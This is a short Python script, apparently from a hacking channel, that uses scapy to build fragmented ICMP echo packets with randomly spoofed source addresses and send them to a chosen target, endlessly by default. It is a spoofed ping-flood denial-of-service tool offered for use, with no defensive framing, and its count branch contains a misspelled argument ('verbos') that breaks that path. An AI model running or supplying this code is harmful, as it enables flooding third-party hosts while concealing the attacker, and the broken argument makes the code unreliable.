#! /usr/bin/env python3
# Channel RemaxBoxTeam
# lhashashinl <--M-->
from scapy.all import *
from scapy import *
import socket

def ping(Target,message,count=False):
    packet = (fragment(IP(dst=Target,src=RandIP(),id=1111,ttl=99)/ICMP(type=8,code=0)/f"{message}"))
    if(count == False):
        send(packet,loop=1,verbose=0)
    else:
        send(packet,count=count,verbos=0)
    
    return packet


        